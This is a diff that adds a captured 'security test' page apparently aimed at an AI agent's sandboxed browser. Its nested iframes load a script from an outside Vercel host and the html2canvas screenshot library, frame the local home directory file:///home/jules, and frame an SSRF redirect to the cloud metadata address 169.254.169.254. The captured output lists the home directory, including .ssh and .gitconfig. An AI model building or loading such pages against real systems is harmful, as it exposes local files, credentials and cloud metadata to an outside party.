@@ -1,0 +1,30 @@
+--- MAIN PAGE HTML ---
+<!DOCTYPE html><html><head>
+  <title>Combined Security Test Iframe</title>
+</head>
+<body>
+  <iframe srcdoc="<script src=&quot;https://donreddy.vercel.app&quot;></script><iframe src=&quot;file:///home/jules&quot; width=&quot;50%&quot; height=&quot;50%&quot;></iframe><iframe src=&quot;https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254%3A80-.j.json&quot; title=&quot;SSRF Test&quot; width=&quot;50%&quot; height=&quot;50%&quot;></iframe>"></iframe>
+
+
+</body></html>
+
+--- OUTER IFRAME (SRCDOC) DOCUMENT HTML ---
+<html><head><script src="https://donreddy.vercel.app"></script><script type="text/javascript" async="" src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js"></script></head><body><iframe src="file:///home/jules" width="50%" height="50%"></iframe><iframe src="https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254%3A80-.j.json" title="SSRF Test" width="50%" height="50%"></iframe></body></html>
+
+--- INNER IFRAME 1 (file:///home/jules) DOCUMENT HTML ---
+<html><head><script>start("/home/jules/");</script>
+<script>onHasParentDirectory();</script>
+<script>addRow(".cache",".cache",1,4096,"4.0 kB",1749059241,"6/4/25, 5:47:21 PM");</script>
+<script>addRow(".local",".local",1,4096,"4.0 kB",1749059247,"6/4/25, 5:47:27 PM");</script>
+<script>addRow(".npm",".npm",1,4096,"4.0 kB",1749059178,"6/4/25, 5:46:18 PM");</script>
+<script>addRow(".pki",".pki",1,4096,"4.0 kB",1749059252,"6/4/25, 5:47:32 PM");</script>
+<script>addRow(".ssh",".ssh",1,4096,"4.0 kB",1746564317,"5/6/25, 8:45:17 PM");</script>
+<script>addRow(".bash_logout",".bash_logout",0,220,"220 B",1711874463,"3/31/24, 8:41:03 AM");</script>
+<script>addRow(".bashrc",".bashrc",0,3771,"3.7 kB",1711874463,"3/31/24, 8:41:03 AM");</script>
+<script>addRow(".gitconfig",".gitconfig",0,135,"135 B",1749058660,"6/4/25, 5:37:40 PM");</script>
+<script>addRow(".profile",".profile",0,807,"807 B",1711874463,"3/31/24, 8:41:03 AM");</script>
+<script>addRow(".sudo_as_admin_successful",".sudo_as_admin_successful",0,0,"0 B",1749057798,"6/4/25, 5:23:18 PM");</script>
+</head><body></body></html>
+
+--- INNER IFRAME 2 (SSRF Test) DOCUMENT HTML ---
+<html><head></head><body></body></html>
